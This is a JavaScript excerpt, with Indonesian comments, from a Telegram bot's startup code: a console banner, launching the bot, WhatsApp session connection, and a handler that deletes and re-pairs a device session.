// --- Jalankan Bot ---
async function initializeBot() {
  await validateToken();

  // Tampilkan teks "Not" dengan gradasi biru
  const notBanner = figlet.textSync('Not', {
    font: 'Standard',
    horizontalLayout: 'default',
    verticalLayout: 'default'
  });

  console.clear();
  console.log(gradient.vice.multiline(notBanner)); // efek biru ke pink

  // Info tambahan
  console.log(chalk.hex('#00FFFF')(`
🦠 Bot Aktif | 🤖 Telegram Bot Siap Digunakan
⏰ ${getCurrentDate()} | ⏱ Uptime: ${getUptime()}
🔗 Creator: t.me/GhostBug3 | 🌐 Version: V4.0

📦 Loaded Modules: Telegraf, Baileys, Axios, Pino, Chalk
📁 Session Path: ./session
💡 Tip: Gunakan /start untuk memulai atau /addsender untuk pairing WhatsApp
`));

  await initializeWhatsAppConnections();

  try {
  await bot.launch();
  console.log(chalk.green("Telegram bot is running..."));
} catch (err) {
  console.error("❌ Gagal menjalankan bot Telegram:", err.message);
}
}

// Handle shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

// Handler tombol ignore (pajangan ✅ / ❌)
bot.action("ignore", (ctx) => ctx.answerCbQuery());

// Handler tombol retry pairing
bot.action(/^retrypairing_(\d+)$/, async (ctx) => {
  const botNumber = ctx.match[1];
  const chatId = ctx.chat.id;

  try {
    const sessionPath = path.join("./session", `device${botNumber}`);
    if (fs.existsSync(sessionPath)) {
      rimraf.sync(sessionPath);
    }

    await ctx.reply(`🔁 Menghapus sesi lama dan memulai ulang pairing untuk: ${botNumber}`);
    await connectToWhatsApp(botNumber, ctx);
  } catch (err) {
    console.error("❌ Gagal ulangi pairing:", err);
    await ctx.reply("❌ Gagal memulai ulang pairing. Coba lagi nanti.");
  }
});

// Jalankan bot
initializeBot();